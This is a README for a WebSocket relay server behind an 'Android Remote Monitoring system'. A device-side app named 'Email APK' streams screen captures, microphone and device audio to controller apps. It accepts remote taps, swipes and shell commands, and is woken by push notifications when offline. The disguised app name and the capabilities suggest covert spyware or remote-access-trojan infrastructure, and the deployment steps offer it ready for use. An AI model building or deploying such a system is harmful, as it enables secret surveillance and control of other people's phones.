# Remote Relay Server

Node.js WebSocket relay server for the Android Remote Monitoring system.  
Routes binary media streams and JSON control commands between **Email APK** (device) and **Controller APK** instances.

---

## Architecture

```
Controller APK ──┐                        ┌── Email APK (device A)
                 │  WebSocket :8080        │
Controller APK ──┼──── Relay Server ───────┼── Email APK (device B)
                 │                         │
Controller APK ──┘                        └── Email APK (device C)
```

Each connection multiplexes multiple logical streams on a **single WebSocket** using a 1-byte type header (see Framing Protocol below).

---

## Framing Protocol

Every WebSocket **binary** message has the structure:

```
┌────────────┬──────────────────────────────────┐
│  type (1B) │  payload (variable)              │
└────────────┴──────────────────────────────────┘
```

| Byte | Name          | Payload                              |
|------|---------------|--------------------------------------|
| 0x01 | SCREEN_FRAME  | JPEG bytes                           |
| 0x02 | MIC_AUDIO     | PCM 16-bit 16 kHz mono               |
| 0x03 | DEVICE_AUDIO  | PCM 16-bit 44.1 kHz stereo           |
| 0x04 | CONTROL_EVENT | UTF-8 JSON                           |
| 0x05 | DEVICE_INFO   | UTF-8 JSON (registration / update)   |
| 0x06 | DEVICE_LIST   | UTF-8 JSON (server → controller)     |
| 0x07 | PING          | empty                                |
| 0x08 | PONG          | empty                                |

---

## Message Flows

### Email APK → Server (registration)
Send a `0x05` frame with JSON body:
```json
{
  "deviceId":       "uuid-v4",
  "deviceName":     "Pixel 8",
  "model":          "Pixel 8",
  "androidVersion": "14",
  "battery":        87,
  "storage":        "12.4 GB free",
  "network":        "WiFi",
  "fcmToken":       "FCM_REGISTRATION_TOKEN"
}
```

### Email APK → Server (live stream frames)
Send `0x01` / `0x02` / `0x03` frames continuously.  
The server forwards them verbatim to all subscribed controllers.

### Controller APK → Server (subscribe)
Send a `0x04` frame with JSON body:
```json
{ "action": "subscribe", "deviceId": "uuid-v4" }
```
Server replies with a `0x06` frame (device list) immediately.  
If the target device is offline the server fires an FCM high-priority push to wake it up.

### Controller APK → Server (control command)
Send a `0x04` frame with any JSON body; the server routes it to the target device:
```json
{ "action": "tap",   "x": 540, "y": 960 }
{ "action": "swipe", "x1": 100, "y1": 500, "x2": 100, "y2": 200 }
{ "action": "keyevent", "keyCode": 4 }
{ "action": "shell",  "cmd": "dumpsys battery" }
```

### Server → Controller APK (device list)
The server sends a `0x06` frame whenever the device list changes:
```json
[
  {
    "deviceId":       "uuid-v4",
    "deviceName":     "Pixel 8",
    "model":          "Pixel 8",
    "androidVersion": "14",
    "battery":        87,
    "storage":        "12.4 GB free",
    "network":        "WiFi",
    "online":         true,
    "lastSeen":       1698854400000
  }
]
```

---

## Setup

### 1. Prerequisites
- Node.js 18 or later
- npm 9 or later

### 2. Install dependencies
```bash
cd relay-server
npm install
```

### 3. Firebase service account (required for FCM wakeup)

1. Go to [Firebase Console](https://console.firebase.google.com) → Project settings → Service accounts.
2. Click **Generate new private key** and download the JSON file.
3. Save it as `firebase-service-account.json` in this directory  
   (or set `FIREBASE_SERVICE_ACCOUNT_PATH` to its absolute path).

> **Security:** Never commit `firebase-service-account.json` to version control.  
> Add it to `.gitignore`.

### 4. Environment variables
```bash
cp .env.example .env
# Edit .env:
#   PORT=8080
#   FIREBASE_SERVICE_ACCOUNT_PATH=./firebase-service-account.json
```

### 5. Run locally
```bash
npm start
```

Verify:
```
GET http://localhost:8080/health   → { status: "ok", ... }
GET http://localhost:8080/devices  → [ ...device list... ]
```

---

## Deployment

### Railway (recommended free tier)

1. Push this directory to a GitHub repo.
2. Create a new Railway project → **Deploy from GitHub repo**.
3. Set environment variables in the Railway dashboard:
   - `PORT` → Railway sets this automatically; leave blank or set `8080`.
   - `FIREBASE_SERVICE_ACCOUNT_PATH` → Upload the file via Railway's volume  
     or encode the JSON as a single-line environment variable and load it in `server.js`.
4. Railway provides a public URL like `wss://your-app.up.railway.app`.

### Render (free tier)

1. Create a new **Web Service** from your GitHub repo.
2. Build command: `npm install`
3. Start command: `node server.js`
4. Set environment variables in Render's dashboard.
5. Render provides a public URL like `wss://your-app.onrender.com`.

> **Note:** Render free tier spins down after 15 minutes of inactivity.  
> Use the `/health` endpoint with an external uptime monitor (e.g. UptimeRobot) to keep it alive.

### Self-hosted (VPS)

```bash
# Install Node.js 18
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Clone and install
git clone <repo> relay-server && cd relay-server
npm install

# Run with PM2 for auto-restart
npm install -g pm2
pm2 start server.js --name relay-server
pm2 save && pm2 startup
```

Use nginx as a reverse proxy for TLS:
```nginx
server {
    listen 443 ssl;
    server_name your.domain.com;

    ssl_certificate     /etc/letsencrypt/live/your.domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your.domain.com/privkey.pem;

    location / {
        proxy_pass         http://localhost:8080;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade    $http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host       $host;
        proxy_read_timeout 86400s;
    }
}
```

---

## WebSocket URL Format

```
ws://localhost:8080          # local dev
wss://your-app.railway.app   # Railway
wss://your-app.onrender.com  # Render
wss://your.domain.com        # self-hosted with TLS
```

Both APKs connect to the same URL — the relay identifies the role from the first message.

---

## HTTP Endpoints

| Method | Path       | Description                               |
|--------|------------|-------------------------------------------|
| GET    | `/health`  | Server uptime, device counts              |
| GET    | `/devices` | Full device registry JSON (debug)         |

---

## FCM Wakeup Flow

```
Controller subscribes to offline deviceId
       │
       ▼
Relay sends FCM high-priority push to device's fcmToken
       │
       ▼
Email APK wakes up, calls startForegroundService()
       │
       ▼
Email APK reconnects WebSocket → registers → streams
       │
       ▼
Relay marks device online, notifies controller
```

The FCM token is supplied by the Email APK in its `DEVICE_INFO` registration frame (`fcmToken` field) and stored in the device registry until the socket reconnects or a new token is provided.

---

## .gitignore recommendations

```
node_modules/
.env
firebase-service-account.json
*.log
```
